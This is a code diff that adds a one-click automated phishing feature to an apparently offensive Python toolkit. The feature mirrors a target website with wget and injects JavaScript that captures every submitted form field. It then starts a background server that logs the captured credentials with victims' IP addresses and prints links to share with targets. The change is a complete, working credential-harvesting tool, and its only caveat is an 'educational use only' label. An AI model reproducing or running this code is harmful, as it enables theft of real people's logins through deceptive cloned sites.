@@ -144,6 +144,237 @@ def download_file(url, destination):
 
 # ==================== PHISHING MODULE ====================
 
+def get_local_ip():
+    """Get local IP address"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "localhost"
+
+def automated_phishing():
+    """Fully automated phishing - clone, inject, serve, and provide link"""
+    print(f"\n{Colors.HEADER}{'='*75}")
+    print("           🚀 FULLY AUTOMATED PHISHING - ONE-CLICK SOLUTION")
+    print(f"{'='*75}{Colors.ENDC}")
+    print(f"""
+{Colors.OKGREEN}This will automatically:{Colors.ENDC}
+  ✅ Clone the target website
+  ✅ Inject credential capture scripts
+  ✅ Start phishing server in background
+  ✅ Give you the final link to share
+
+{Colors.WARNING}⚠️  FOR EDUCATIONAL USE ONLY{Colors.ENDC}
+    """)
+    
+    # Get target URL
+    target_url = input(f"{Colors.WARNING}Enter target URL: {Colors.ENDC}").strip()
+    
+    if not target_url:
+        print(f"{Colors.FAIL}[!] No URL provided{Colors.ENDC}")
+        input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")
+        return
+    
+    if not target_url.startswith(('http://', 'https://')):
+        target_url = 'https://' + target_url
+    
+    print(f"\n{Colors.HEADER}{'='*60}")
+    print("  STARTING AUTOMATED PROCESS")
+    print(f"{'='*60}{Colors.ENDC}")
+    
+    # Step 1: Clone website
+    print(f"\n{Colors.OKGREEN}[1/5] Cloning website...{Colors.ENDC}")
+    
+    # Extract domain for directory name
+    from urllib.parse import urlparse
+    domain = urlparse(target_url).netloc.replace('.', '_').replace(':', '_')
+    campaign_dir = PHISHING_DIR / f"auto_{domain}_{int(time.time())}"
+    campaign_dir.mkdir(parents=True, exist_ok=True)
+    
+    # Clone with wget
+    clone_cmd = f"""wget --mirror \
+        --convert-links \
+        --adjust-extension \
+        --page-requisites \
+        --no-parent \
+        --random-wait \
+        --timeout=30 \
+        --tries=3 \
+        --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
+        -P "{campaign_dir}" \
+        "{target_url}" 2>&1"""
+    
+    try:
+        subprocess.run(clone_cmd, shell=True, timeout=180, capture_output=True)
+        print(f"{Colors.OKGREEN}✅ Website cloned{Colors.ENDC}")
+    except:
+        print(f"{Colors.WARNING}⚠️  Cloning completed with warnings{Colors.ENDC}")
+    
+    # Step 2: Inject capture script
+    print(f"\n{Colors.OKGREEN}[2/5] Injecting credential capture...{Colors.ENDC}")
+    
+    capture_js = """
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var data = {};
+        var inputs = form.querySelectorAll('input');
+        inputs.forEach(function(input) {
+            if(input.name) data[input.name] = input.value;
+        });
+        fetch('/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+        }).catch(function(err) { console.log('Capture failed'); });
+    });
+    console.log('🎣 Phishing capture active');
+});
+</script>
+"""
+    
+    html_files = list(campaign_dir.rglob("*.html")) + list(campaign_dir.rglob("*.htm"))
+    injected = 0
+    
+    for html_file in html_files:
+        try:
+            with open(html_file, 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+            
+            if '</body>' in content.lower():
+                content = content.replace('</body>', capture_js + '</body>', 1)
+                with open(html_file, 'w', encoding='utf-8') as f:
+                    f.write(content)
+                injected += 1
+        except:
+            pass
+    
+    print(f"{Colors.OKGREEN}✅ Injected into {injected} files{Colors.ENDC}")
+    
+    # Step 3: Create server
+    print(f"\n{Colors.OKGREEN}[3/5] Creating phishing server...{Colors.ENDC}")
+    
+    server_code = '''#!/usr/bin/env python3
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+import json
+import os
+from datetime import datetime
+
+class PhishingHandler(SimpleHTTPRequestHandler):
+    def do_POST(self):
+        if self.path == '/capture':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            
+            try:
+                data = json.loads(post_data.decode('utf-8'))
+                log_file = 'captured_credentials.json'
+                
+                if os.path.exists(log_file):
+                    with open(log_file, 'r') as f:
+                        logs = json.load(f)
+                else:
+                    logs = []
+                
+                logs.append({
+                    'timestamp': datetime.now().isoformat(),
+                    'ip': self.client_address[0],
+                    'data': data
+                })
+                
+                with open(log_file, 'w') as f:
+                    json.dump(logs, f, indent=2)
+                
+                print(f"\\n🎣 CAPTURED from {self.client_address[0]}: {json.dumps(data)}")
+            except:
+                pass
+            
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.send_header('Access-Control-Allow-Origin', '*')
+            self.end_headers()
+            self.wfile.write(b'{"status":"ok"}')
+        else:
+            self.send_response(404)
+            self.end_headers()
+    
+    def log_message(self, format, *args):
+        pass
+
+if __name__ == '__main__':
+    PORT = 8080
+    print(f"🎣 Server running on port {PORT}")
+    httpd = HTTPServer(('0.0.0.0', PORT), PhishingHandler)
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print("\\nServer stopped")
+'''
+    
+    server_file = campaign_dir / "server.py"
+    with open(server_file, 'w') as f:
+        f.write(server_code)
+    server_file.chmod(0o755)
+    
+    print(f"{Colors.OKGREEN}✅ Server created{Colors.ENDC}")
+    
+    # Step 4: Start server in background
+    print(f"\n{Colors.OKGREEN}[4/5] Starting server in background...{Colors.ENDC}")
+    
+    # Start server as background process
+    port = 8080
+    os.chdir(campaign_dir)
+    
+    subprocess.Popen(
+        ["python3", "server.py"],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        start_new_session=True
+    )
+    
+    time.sleep(2)  # Wait for server to start
+    print(f"{Colors.OKGREEN}✅ Server running{Colors.ENDC}")
+    
+    # Step 5: Generate and display links
+    print(f"\n{Colors.OKGREEN}[5/5] Generating access links...{Colors.ENDC}")
+    local_ip = get_local_ip()
+    
+    print(f"\n{Colors.HEADER}{'='*75}")
+    print("  ✅ PHISHING SITE READY - SHARE THESE LINKS!")
+    print(f"{'='*75}{Colors.ENDC}\n")
+    
+    print(f"{Colors.OKGREEN}📱 SHARE THESE LINKS:{Colors.ENDC}\n")
+    print(f"{Colors.OKBLUE}   Local Access (This device):{Colors.ENDC}")
+    print(f"   http://localhost:{port}\n")
+    
+    print(f"{Colors.OKGREEN}   Network Access (Same WiFi):{Colors.ENDC}")
+    print(f"{Colors.BOLD}   http://{local_ip}:{port}{Colors.ENDC}")
+    print(f"   {Colors.WARNING}👆 COPY THIS LINK TO SHARE{Colors.ENDC}\n")
+    
+    print(f"{Colors.OKCYAN}📂 Files Location:{Colors.ENDC}")
+    print(f"   {campaign_dir}\n")
+    
+    print(f"{Colors.OKCYAN}📊 Captured Credentials:{Colors.ENDC}")
+    print(f"   {campaign_dir}/captured_credentials.json\n")
+    
+    print(f"{Colors.HEADER}{'='*75}{Colors.ENDC}")
+    print(f"{Colors.OKGREEN}  Server is running in background{Colors.ENDC}")
+    print(f"{Colors.OKGREEN}  Credentials will be saved automatically{Colors.ENDC}")
+    print(f"{Colors.HEADER}{'='*75}{Colors.ENDC}\n")
+    
+    print(f"{Colors.OKCYAN}📋 To view captured credentials:{Colors.ENDC}")
+    print(f"   cat {campaign_dir}/captured_credentials.json\n")
+    
+    print(f"{Colors.WARNING}🛑 To stop server (find PID first):{Colors.ENDC}")
+    print(f"   ps aux | grep server.py")
+    print(f"   kill <PID>\n")
+    
+    input(f"{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")
+
 def phishing_menu():
     """Phishing module main menu"""
     while True:
@@ -151,6 +382,8 @@ def phishing_menu():
         print("                    🎣 PHISHING MODULE - EDUCATIONAL ONLY")
         print(f"{'='*75}{Colors.ENDC}")
         print(f"""
+{Colors.OKGREEN}🚀 9. FULLY AUTOMATED PHISHING (One-Click Solution){Colors.ENDC}
+{Colors.HEADER}{'─'*75}{Colors.ENDC}
 {Colors.OKBLUE}1.{Colors.ENDC} Clone Website (HTTrack)
 {Colors.OKBLUE}2.{Colors.ENDC} Clone Website (wget - Simple)
 {Colors.OKBLUE}3.{Colors.ENDC} Setup Phishing Server (with credential capture)
@@ -164,7 +397,9 @@ def phishing_menu():
         
         choice = input(f"{Colors.WARNING}Select option: {Colors.ENDC}").strip()
         
-        if choice == '1':
+        if choice == '9':
+            automated_phishing()
+        elif choice == '1':
             clone_website_httrack()
         elif choice == '2':
             clone_website_wget()
